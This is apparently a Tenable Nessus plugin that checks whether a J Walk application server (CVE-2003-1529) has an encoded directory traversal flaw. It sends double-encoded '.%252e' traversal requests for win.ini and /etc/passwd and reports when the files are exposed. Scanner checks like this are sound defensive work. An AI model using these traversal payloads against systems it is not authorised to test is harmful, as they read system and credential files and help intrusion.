#
# (C) Tenable Network Security, Inc.
#


include("compat.inc");


if(description)
{
 script_id(11467);
 script_version ("$Revision: 1.11 $");
 script_cve_id("CVE-2003-1529");
 script_bugtraq_id(7160);
 script_xref(name:"OSVDB", value:"4927");
 script_xref(name:"Secunia", value:"8411");
 
 script_name(english:"J Walk Application Server Encoded Directory Traversal Vulnerability");
 script_summary(english:"Reads a file outside the web root");
 
 script_set_attribute(
   attribute:"synopsis",
   value:string(
     "A web application on the remote host has a directory traversal\n",
     "vulnerability."
   )
 );
 script_set_attribute(
   attribute:"description", 
   value:string(
     "The version of J Walk running on the remote host has a directory\n",
     "traversal vulnerability.  It is possible to read arbitrary files\n",
     "by prepending '.%252e/.%2523' to a filename.  A remote attacker could\n",
     "exploit this to read sensitive information that might be used to\n",
     "mount further attacks."
   )
 );
 script_set_attribute(
   attribute:"see_also",
   value:"http://archives.neohapsis.com/archives/bugtraq/2003-03/0357.html"
 );
 script_set_attribute(
   attribute:"solution", 
   value:"Upgrade to J Walk 3.3c4 or later."
 );
 script_set_attribute(
   attribute:"cvss_vector", 
   value:"CVSS2#AV:N/AC:L/Au:N/C:P/I:N/A:N"
 );
 script_end_attributes();

 script_category(ACT_ATTACK);
 script_family(english:"CGI abuses");
 
 script_copyright(english:"This script is Copyright (C) 2003-2009 Tenable Network Security, Inc.");

 script_dependencie("http_version.nasl", "find_service1.nasl", "no404.nasl", "httpver.nasl");
 script_require_ports("Services/www", 80);

 exit(0);
}

#
# The script code starts here
#
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");

port = get_http_port(default:80);

i=0;
r[i] = "/.%252e/.%252e/.%252e/.%252e/windows/win.ini";	i=i+1;
r[i] = "/.%252e/.%252e/.%252e/.%252e/winnt/win.ini";	i=i+1;


for (i=0; r[i]; i=i+1)
{
  if (check_win_dir_trav(port: port, url: r[i]))
  {
    security_warning(port);
    exit(0);
  }
}


url = "/.%252e/.%252e/.%252e/.%252e/.%252e/.%252e/.%252e/etc/passwd";
rc = http_send_recv3(method:"GET", item:url, port:port);
if (isnull(rc)) exit(1, "The server did not respond.");

if(egrep(pattern:"root:.*:0:[01]:", string:rc[2]))
{
  security_warning(port);
  exit(0);
}
